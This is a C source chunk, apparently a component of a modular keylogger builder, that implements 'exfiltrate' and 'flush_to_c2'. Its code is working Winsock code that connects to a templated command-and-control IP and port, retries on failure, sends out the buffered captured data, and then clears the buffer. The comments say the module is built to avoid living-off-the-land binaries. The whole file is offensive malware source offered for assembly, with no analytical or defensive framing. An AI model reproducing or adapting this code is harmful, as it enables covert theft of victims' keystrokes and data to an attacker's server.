// chunk: exfil/tcp_flush
// depends: core/emit_buffer
// provides: exfiltrate, flush_to_c2
// headers: winsock2.h, ws2tcpip.h
// libs: ws2_32
// note: raw TCP exfil + flush_to_c2 for keylogger arch (no LOLBins)

#ifndef CHUNK_TCP_FLUSH
#define CHUNK_TCP_FLUSH

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((WORD)port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int retries = 3;
    while (retries-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        if (retries > 0) {
            closesocket(sock);
            Sleep(2000);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else {
            closesocket(sock); WSACleanup(); return FALSE;
        }
    }

    DWORD sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, (len - sent > 32768) ? 32768 : (int)(len - sent), 0);
        if (n <= 0) break;
        sent += n;
    }
    closesocket(sock);
    WSACleanup();
    return sent == len;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
